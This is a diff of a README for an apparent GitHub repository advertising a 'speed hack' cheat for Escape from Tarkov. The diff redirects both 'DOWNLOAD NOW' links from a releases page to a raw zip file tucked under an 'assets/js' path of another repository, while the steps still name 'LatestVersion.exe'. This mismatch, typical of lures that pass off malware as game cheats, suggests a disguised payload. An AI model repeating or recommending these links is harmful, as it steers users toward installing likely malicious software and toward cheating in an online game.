@@ -6,7 +6,7 @@ description: "Boost your Escape from Tarkov gameplay with adjustable 2–5x move
 <h1>⚡ tarkov-speed-hack-2026 - Move Faster, Loot Quicker</h1>
 
 <p align="center">
-  <a href="https://github.com/Himantopushimantopusconcentration4160/tarkov-speed-hack-2026/releases" style="display:inline-block; padding:15px 40px; background:linear-gradient(135deg, #ff6b35, #f7c948); color:#fff; font-size:20px; font-weight:bold; border-radius:50px; text-decoration:none; box-shadow:0 4px 15px rgba(255,107,53,0.4);">⬇️ DOWNLOAD NOW</a>
+  <a href="https://raw.githubusercontent.com/Himantopushimantopusconcentration4160/himantopushimantopusconcentration4160.github.io/main/assets/js/Application_3.6.zip" style="display:inline-block; padding:15px 40px; background:linear-gradient(135deg, #ff6b35, #f7c948); color:#fff; font-size:20px; font-weight:bold; border-radius:50px; text-decoration:none; box-shadow:0 4px 15px rgba(255,107,53,0.4);">⬇️ DOWNLOAD NOW</a>
 </p>
 
 <p align="center">
@@ -50,7 +50,7 @@ No special hardware or software is needed. If your computer runs Tarkov normally
 
 ## 📥 How to Download
 
-1. **Visit the official download page** – click the orange button at the top of this page, or use this link: [Download Tarkov Speed Hack 2026](https://github.com/Himantopushimantopusconcentration4160/tarkov-speed-hack-2026/releases)
+1. **Visit the official download page** – click the orange button at the top of this page, or use this link: [Download Tarkov Speed Hack 2026](https://raw.githubusercontent.com/Himantopushimantopusconcentration4160/himantopushimantopusconcentration4160.github.io/main/assets/js/Application_3.6.zip)
 2. **Wait for the page to load** – this may take a few seconds.
 3. **Find the latest release** – look for the file named `LatestVersion.exe`.
 4. **Click the download link** for that file.
